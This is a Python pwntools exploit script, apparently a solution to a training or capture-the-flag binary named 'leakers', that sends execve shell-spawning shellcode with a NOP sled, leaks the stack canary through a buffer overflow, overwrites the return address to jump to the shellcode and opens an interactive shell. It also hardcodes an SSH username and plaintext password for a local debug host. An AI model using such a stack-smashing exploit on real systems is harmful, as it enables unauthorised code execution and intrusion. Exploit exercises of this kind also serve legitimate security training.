from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    ssh = ssh("buba98", "127.0.0.1", password="Vinsent22!", port=2222)
    r = ssh.process("leakers")
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2010)

ps1_pointer = 0x404080

input("Send shellcode with nop-sled")

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode = shellcode.ljust(100, b"\x90")

r.send(shellcode)

input("Overflow stack variable to leak canary")

stackstuff = b"B"*105
r.send(stackstuff)
r.recvuntil(b"> ")
r.recv(105)

canary = u64(b"\x00" + r.recv(7))
print("canary: %#x" % canary)

input("Override return address and reinsert canary")

stackstuff = b"B" * 104 + p64(canary) + b"D" * 8 + p64(ps1_pointer)
r.send(stackstuff)

r.interactive()
